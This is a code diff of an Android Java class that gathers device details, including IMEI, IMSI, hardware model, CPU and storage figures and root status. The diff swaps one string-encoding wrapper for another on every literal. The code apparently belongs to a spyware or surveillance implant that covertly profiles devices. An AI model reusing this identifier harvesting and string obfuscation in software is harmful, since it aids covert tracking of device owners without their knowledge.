@@ -104,24 +104,24 @@ public class ModuleDevice extends BaseInstantModule {
 		}
 
 		// SYSTEM
-		sb.append(M.d("-- SYSTEM --") + "\n"); //$NON-NLS-1$
-		sb.append(M.d("Board: ") + Build.BOARD + "\n");
-		sb.append(M.d("Brand: ") + Build.BRAND + "\n");
-		sb.append(M.d("Device: ") + Build.DEVICE + "\n");
-		sb.append(M.d("Display: ") + Build.MODEL + "\n");
-		sb.append(M.d("Model:") + Build.DISPLAY + "\n");
+		sb.append(M.e("-- SYSTEM --") + "\n"); //$NON-NLS-1$
+		sb.append(M.e("Board: ") + Build.BOARD + "\n");
+		sb.append(M.e("Brand: ") + Build.BRAND + "\n");
+		sb.append(M.e("Device: ") + Build.DEVICE + "\n");
+		sb.append(M.e("Display: ") + Build.MODEL + "\n");
+		sb.append(M.e("Model:") + Build.DISPLAY + "\n");
 
-		sb.append(M.d("IMEI: ") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(M.e("IMEI: ") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (Device.self().getImei().length() == 0) {
-			sb.append(M.d("IMSI: SIM not present") + "\n"); //$NON-NLS-1$
+			sb.append(M.e("IMSI: SIM not present") + "\n"); //$NON-NLS-1$
 		} else {
-			sb.append(M.d("IMSI: ") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(M.e("IMSI: ") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		sb.append(M.d("cpuUsage: ") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-		sb.append(M.d("cpuTotal: ") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-		sb.append(M.d("cpuIdle: ") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(M.e("cpuUsage: ") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(M.e("cpuTotal: ") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(M.e("cpuIdle: ") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
 		long bytesAvailableInt = (long) stat.getBlockSize() * (long) stat.getBlockCount();
@@ -135,13 +135,13 @@ public class ModuleDevice extends BaseInstantModule {
 
 		if (Cfg.DEBUG) {
 			if (Status.self().haveRoot()) {
-				sb.append(M.d("root: yes") + "\n"); //$NON-NLS-1$
+				sb.append(M.e("root: yes") + "\n"); //$NON-NLS-1$
 			} else {
-				sb.append(M.d("root: no") + "\n"); //$NON-NLS-1$
+				sb.append(M.e("root: no") + "\n"); //$NON-NLS-1$
 			}
 		}
 
-		sb.append(M.d("-- PROPERTIES --") + "\n"); //$NON-NLS-1$
+		sb.append(M.e("-- PROPERTIES --") + "\n"); //$NON-NLS-1$
 		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
 
 		while (it.hasNext()) {
@@ -177,7 +177,7 @@ public class ModuleDevice extends BaseInstantModule {
 	private void readCpuUsage() {
 		try {
 			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(
-					M.d("/proc/stat"))), //$NON-NLS-1$
+					M.e("/proc/stat"))), //$NON-NLS-1$
 					1000);
 			final String load = reader.readLine();
 			reader.close();
